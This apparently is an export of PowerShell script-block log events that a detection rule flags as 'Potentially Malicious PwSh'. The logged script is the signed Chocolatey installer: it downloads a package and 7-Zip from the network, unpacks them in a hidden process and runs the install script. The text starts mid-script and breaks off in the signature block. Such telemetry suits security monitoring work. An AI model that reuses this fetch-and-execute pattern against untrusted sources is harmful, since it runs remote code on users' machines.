$explicitProxyUser = $env:chocolateyProxyUser $explicitProxyPassword = $env:chocolateyProxyPassword if ($explicitProxy -ne $null -and $explicitProxy -ne '') { # explicit proxy $proxy = New-Object System.Net.WebProxy($explicitProxy, $true) if ($explicitProxyPassword -ne $null -and $explicitProxyPassword -ne '') { $passwd = ConvertTo-SecureString $explicitProxyPassword -AsPlainText -Force $proxy.Credentials = New-Object System.Management.Automation.PSCredential ($explicitProxyUser, $passwd) } Write-Debug ""Using explicit proxy server '$explicitProxy'."" $downloader.Proxy = $proxy } elseif (!$downloader.Proxy.IsBypassed($url)) { # system proxy (pass through) $creds = $defaultCreds if ($creds -eq $null) { Write-Debug ""Default credentials were null. Attempting backup method"" $cred = get-credential $creds = $cred.GetNetworkCredential(); } $proxyaddress = $downloader.Proxy.GetProxy($url).Authority Write-Debug ""Using system proxy server '$proxyaddress'."" $proxy = New-Object System.Net.WebProxy($proxyaddress) $proxy.Credentials = $creds $downloader.Proxy = $proxy } } return $downloader } function Download-String { param ( [string]$url ) $downloader = Get-Downloader $url return $downloader.DownloadString($url) } function Download-File { param ( [string]$url, [string]$file ) #Write-Output ""Downloading $url to $file"" $downloader = Get-Downloader $url $downloader.DownloadFile($url, $file) } if ($url -eq $null -or $url -eq '') { Write-Output ""Getting latest version of the Chocolatey package for download."" $url = 'https://chocolatey.org/api/v2/Packages()?$filter=((Id%20eq%20%27chocolatey%27)%20and%20(not%20IsPrerelease))%20and%20IsLatestVersion' [xml]$result = Download-String $url $url = $result.feed.entry.content.src } # Download the Chocolatey package Write-Output ""Getting Chocolatey from $url."" Download-File $url $file # Determine unzipping method # 7zip is the most compatible so use it by default $7zaExe = Join-Path $tempDir '7za.exe' $unzipMethod = '7zip' $useWindowsCompression = $env:chocolateyUseWindowsCompression if ($useWindowsCompression -ne $null -and $useWindowsCompression -eq 'true') { Write-Output 'Using built-in compression to unzip' $unzipMethod = 'builtin' } elseif (-Not (Test-Path ($7zaExe))) { Write-Output ""Downloading 7-Zip commandline tool prior to extraction."" # download 7zip Download-File 'https://chocolatey.org/7za.exe' ""$7zaExe"" } # unzip the package Write-Output ""Extracting $file to $tempDir..."" if ($unzipMethod -eq '7zip') { $params = ""x -o`""$tempDir`"" -bd -y `""$file`"""" # use more robust Process as compared to Start-Process -Wait (which doesn't # wait for the process to finish in PowerShell v3) $process = New-Object System.Diagnostics.Process $process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($7zaExe, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.Start() | Out-Null $process.BeginOutputReadLine() $process.WaitForExit() $exitCode = $process.ExitCode $process.Dispose() $errorMessage = ""Unable to unzip package using 7zip. Perhaps try setting `$env:chocolateyUseWindowsCompression = 'true' and call install again. Error:"" switch ($exitCode) { 0 { break } 1 { throw ""$errorMessage Some files could not be extracted"" } 2 { throw ""$errorMessage 7-Zip encountered a fatal error while extracting the files"" } 7 { throw ""$errorMessage 7-Zip command line error"" } 8 { throw ""$errorMessage 7-Zip out of memory"" } 255 { throw ""$errorMessage Extraction cancelled by the user"" } default { throw ""$errorMessage 7-Zip signalled an unknown error (code $exitCode)"" } } } else { if ($PSVersionTable.PSVersion.Major -lt 5) { try { $shellApplication = new-object -com shell.application $zipPackage = $shellApplication.NameSpace($file) $destinationFolder = $shellApplication.NameSpace($tempDir) $destinationFolder.CopyHere($zipPackage.Items(),0x10) } catch { throw ""Unable to unzip package using built-in compression. Set `$env:chocolateyUseWindowsCompression = 'false' and call install again to use 7zip to unzip. Error: `n $_"" } } else { Expand-Archive -Path ""$file"" -DestinationPath ""$tempDir"" -Force } } # Call chocolatey install Write-Output ""Installing chocolatey on this machine"" $toolsFolder = Join-Path $tempDir ""tools"" $chocInstallPS1 = Join-Path $toolsFolder ""chocolateyInstall.ps1"" & $chocInstallPS1 Write-Output 'Ensuring chocolatey commands are on the path' $chocInstallVariableName = ""ChocolateyInstall"" $chocoPath = [Environment]::GetEnvironmentVariable($chocInstallVariableName) if ($chocoPath -eq $null -or $chocoPath -eq '') { $chocoPath = ""$env:ALLUSERSPROFILE\Chocolatey"" } if (!(Test-Path ($chocoPath))) { $chocoPath = ""$env:SYSTEMDRIVE\ProgramData\Chocolatey"" } $chocoExePath = Join-Path $chocoPath 'bin' if ($($env:Path).ToLower().Contains($($chocoExePath).ToLower()) -eq $false) { $env:Path = [Environment]::GetEnvironmentVariable('Path',[System.EnvironmentVariableTarget]::Machine); } Write-Output 'Ensuring","MessageNumber: 1 ¦ MessageTotal: 2 ¦ Path: ¦ ScriptBlockId: e992c6bd-f3bf-42a3-80ea-9e74d03e44fe ¦ ScriptBlockText: # ===================================================================== # Copyright 2017 - Present Chocolatey Software, Inc, and the # original authors/contributors from ChocolateyGallery # Copyright 2011 - 2017 RealDimensions Software, LLC, and the # original authors/contributors from ChocolateyGallery # at https://github.com/chocolatey/chocolatey.org # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. # ===================================================================== # For organizational deployments of Chocolatey, please see https://chocolatey.org/docs/how-to-setup-offline-installation # Environment Variables, specified as $env:NAME in PowerShell.exe and %NAME% in cmd.exe. # For explicit proxy, please set $env:chocolateyProxyLocation and optionally $env:chocolateyProxyUser and $env:chocolateyProxyPassword # For an explicit version of Chocolatey, please set $env:chocolateyVersion = 'versionnumber' # To target a different url for chocolatey.nupkg, please set $env:chocolateyDownloadUrl = 'full url to nupkg file' # NOTE: $env:chocolateyDownloadUrl does not work with $env:chocolateyVersion. # To use built-in compression instead of 7zip (requires additional download), please set $env:chocolateyUseWindowsCompression = 'true' # To bypass the use of any proxy, please set $env:chocolateyIgnoreProxy = 'true' #specifically use the API to get the latest version (below) $url = '' $chocolateyVersion = $env:chocolateyVersion if (![string]::IsNullOrEmpty($chocolateyVersion)){ Write-Output ""Downloading specific version of Chocolatey: $chocolateyVersion"" $url = ""https://chocolatey.org/api/v2/package/chocolatey/$chocolateyVersion"" } $chocolateyDownloadUrl = $env:chocolateyDownloadUrl if (![string]::IsNullOrEmpty($chocolateyDownloadUrl)){ Write-Output ""Downloading Chocolatey from : $chocolateyDownloadUrl"" $url = ""$chocolateyDownloadUrl"" } if ($env:TEMP -eq $null) { $env:TEMP = Join-Path $env:SystemDrive 'temp' } $chocTempDir = Join-Path $env:TEMP ""chocolatey"" $tempDir = Join-Path $chocTempDir ""chocInstall"" if (![System.IO.Directory]::Exists($tempDir)) {[void][System.IO.Directory]::CreateDirectory($tempDir)} $file = Join-Path $tempDir ""chocolatey.zip"" # PowerShell v2/3 caches the output stream. Then it throws errors due # to the FileStream not being what is expected. Fixes ""The OS handle's # position is not what FileStream expected. Do not use a handle # simultaneously in one FileStream and in Win32 code or another # FileStream."" function Fix-PowerShellOutputRedirectionBug { $poshMajorVerion = $PSVersionTable.PSVersion.Major if ($poshMajorVerion -lt 4) { try{ # http://www.leeholmes.com/blog/2008/07/30/workaround-the-os-handles-position-is-not-what-filestream-expected/ plus comments $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $objectRef = $host.GetType().GetField(""externalHostRef"", $bindingFlags).GetValue($host) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetProperty"" $consoleHost = $objectRef.GetType().GetProperty(""Value"", $bindingFlags).GetValue($objectRef, @()) [void] $consoleHost.GetType().GetProperty(""IsStandardOutputRedirected"", $bindingFlags).GetValue($consoleHost, @()) $bindingFlags = [Reflection.BindingFlags] ""Instance,NonPublic,GetField"" $field = $consoleHost.GetType().GetField(""standardOutputWriter"", $bindingFlags) $field.SetValue($consoleHost, [Console]::Out) [void] $consoleHost.GetType().GetProperty(""IsStandardErrorRedirected"", $bindingFlags).GetValue($consoleHost, @()) $field2 = $consoleHost.GetType().GetField(""standardErrorWriter"", $bindingFlags) $field2.SetValue($consoleHost, [Console]::Error) } catch { Write-Output ""Unable to apply redirection fix."" } } } Fix-PowerShellOutputRedirectionBug # Attempt to set highest encryption available for SecurityProtocol. # PowerShell will not set this by default (until maybe .NET 4.6.x). This # will typically produce a message for PowerShell v2 (just an info # message though) try { # Set TLS 1.2 (3072), then TLS 1.1 (768), then TLS 1.0 (192), finally SSL 3.0 (48) # Use integers because the enumeration values for TLS 1.2 and TLS 1.1 won't # exist in .NET 4.0, even though they are addressable if .NET 4.5+ is # installed (.NET 4.5 is an in-place upgrade). [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192 -bor 48 } catch { Write-Output 'Unable to set PowerShell to use TLS 1.2 and TLS 1.1 due to old .NET Framework installed. If you see underlying connection closed or trust errors, you may need to do one or more of the following: (1) upgrade to .NET Framework 4.5+ and PowerShell v3, (2) specify internal Chocolatey package location (set $env:chocolateyDownloadUrl prior to install or host the package internally), (3) use the Download + PowerShell method of install. See https://chocolatey.org/install for all install options.' } function Get-Downloader { param ( [string]$url ) $downloader = new-object System.Net.WebClient $defaultCreds = [System.Net.CredentialCache]::DefaultCredentials if ($defaultCreds -ne $null) { $downloader.Credentials = $defaultCreds } $ignoreProxy = $env:chocolateyIgnoreProxy if ($ignoreProxy -ne $null -and $ignoreProxy -eq 'true') { Write-Debug ""Explicitly bypassing proxy due to user environment variable"" $downloader.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy() } else { # check if a proxy is required $explicitProxy = $env:chocolateyProxyLocation $explicitProxyUser = $env:chocolateyProxyUser $explicitProxyPassword = $env:chocolateyProxyPassword if ($explicitProxy -ne $null -and $explicitProxy -ne '') { # explicit proxy $proxy = New-Object System.Net.WebProxy($explicitProxy, $true) if ($explicitProxyPassword -ne $null -and $explicitProxyPassword -ne '') { $passwd = ConvertTo-SecureString $explicitProxyPassword -AsPlainText -Force $proxy.Credentials = New-Object System.Management.Automation.PSCredential ($explicitProxyUser, $passwd) } Write-Debug ""Using explicit proxy server '$explicitProxy'."" $downloader.Proxy = $proxy } elseif (!$downloader.Proxy.IsBypassed($url)) { # system proxy (pass through) $creds = $defaultCreds if ($creds -eq $null) { Write-Debug ""Default credentials were null. Attempting backup method"" $cred = get-credential $creds = $cred.GetNetworkCredential(); } $proxyaddress = $downloader.Proxy.GetProxy($url).Authority Write-Debug ""Using system proxy server '$proxyaddress'."" $proxy = New-Object System.Net.WebProxy($proxyaddress) $proxy.Credentials = $creds $downloader.Proxy = $proxy } } return $downloader } function Download-String { param ( [string]$url ) $downloader = Get-Downloader $url return $downloader.DownloadString($url) } function Download-File { param ( [string]$url, [string]$file ) #Write-Output ""Downloading $url to $file"" $downloader = Get-Downloader $url $downloader.DownloadFile($url, $file) } if ($url -eq $null -or $url -eq '') { Write-Output ""Getting latest version of the Chocolatey package for download."" $url = 'https://chocolatey.org/api/v2/Packages()?$filter=((Id%20eq%20%27chocolatey%27)%20and%20(not%20IsPrerelease))%20and%20IsLatestVersion' [xml]$result = Download-String $url $url = $result.feed.entry.content.src } # Download the Chocolatey package Write-Output ""Getting Chocolatey from $url."" Download-File $url $file # Determine unzipping method # 7zip is the most compatible so use it by default $7zaExe = Join-Path $tempDir '7za.exe' $unzipMethod = '7zip' $useWindowsCompression = $env:chocolateyUseWindowsCompression if ($useWindowsCompression -ne $null -and $useWindowsCompression -eq 'true') { Write-Output 'Using built-in compression to unzip' $unzipMethod = 'builtin' } elseif (-Not (Test-Path ($7zaExe))) { Write-Output ""Downloading 7-Zip commandline tool prior to extraction."" # download 7zip Download-File 'https://chocolatey.org/7za.exe' ""$7zaExe"" } # unzip the package Write-Output ""Extracting $file to $tempDir..."" if ($unzipMethod -eq '7zip') { $params = ""x -o`""$tempDir`"" -bd -y `""$file`"""" # use more robust Process as compared to Start-Process -Wait (which doesn't # wait for the process to finish in PowerShell v3) $process = New-Object System.Diagnostics.Process $process.StartInfo = New-Object System.Diagnostics.ProcessStartInfo($7zaExe, $params) $process.StartInfo.RedirectStandardOutput = $true $process.StartInfo.UseShellExecute = $false $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden $process.Start() | Out-Null $process.BeginOutputReadLine() $process.WaitForExit() $exitCode = $process.ExitCode $process.Dispose() $errorMessage = ""Unable to unzip package using 7zip. Perhaps try setting `$env:chocolateyUseWindowsCompression = 'true' and call install again. Error:"" switch ($exitCode) { 0 { break } 1 { throw ""$errorMessage Some files could not be extracted"" } 2 { throw ""$errorMessage 7-Zip encountered a fatal error while extracting the files"" } 7 { throw ""$errorMessage 7-Zip command line error"" } 8 { throw ""$errorMessage 7-Zip out of memory"" } 255 { throw ""$errorMessage Extraction cancelled by the user"" } default { throw ""$errorMessage 7-Zip signalled an unknown error (code $exitCode)"" } } } else { if ($PSVersionTable.PSVersion.Major -lt 5) { try { $shellApplication = new-object -com shell.application $zipPackage = $shellApplication.NameSpace($file) $destinationFolder = $shellApplication.NameSpace($tempDir) $destinationFolder.CopyHere($zipPackage.Items(),0x10) } catch { throw ""Unable to unzip package using built-in compression. Set `$env:chocolateyUseWindowsCompression = 'false' and call install again to use 7zip to unzip. Error: `n $_"" } } else { Expand-Archive -Path ""$file"" -DestinationPath ""$tempDir"" -Force } } # Call chocolatey install Write-Output ""Installing chocolatey on this machine"" $toolsFolder = Join-Path $tempDir ""tools"" $chocInstallPS1 = Join-Path $toolsFolder ""chocolateyInstall.ps1"" & $chocInstallPS1 Write-Output 'Ensuring chocolatey commands are on the path' $chocInstallVariableName = ""ChocolateyInstall"" $chocoPath = [Environment]::GetEnvironmentVariable($chocInstallVariableName) if ($chocoPath -eq $null -or $chocoPath -eq '') { $chocoPath = ""$env:ALLUSERSPROFILE\Chocolatey"" } if (!(Test-Path ($chocoPath))) { $chocoPath = ""$env:SYSTEMDRIVE\ProgramData\Chocolatey"" } $chocoExePath = Join-Path $chocoPath 'bin' if ($($env:Path).ToLower().Contains($($chocoExePath).ToLower()) -eq $false) { $env:Path = [Environment]::GetEnvironmentVariable('Path',[System.EnvironmentVariableTarget]::Machine); } Write-Output 'Ensuring","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:27.640 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,52,"ScriptBlock: chocolatey.nupkg is in the lib folder' $chocoPkgDir = Join-Path $chocoPath 'lib\chocolatey' $nupkg = Join-Path $chocoPkgDir 'chocolatey.nupkg' if (![System.IO.Directory]::Exists($chocoPkgDir)) { [System.IO.Directory]::CreateDirectory($chocoPkgDir); } Copy-Item ""$file"" ""$nupkg"" -Force -ErrorAction SilentlyContinue # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCwOp6FidSBO5Iv # lE9iERBozojbv+kSIs4jFgY+Ky11ZqCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # 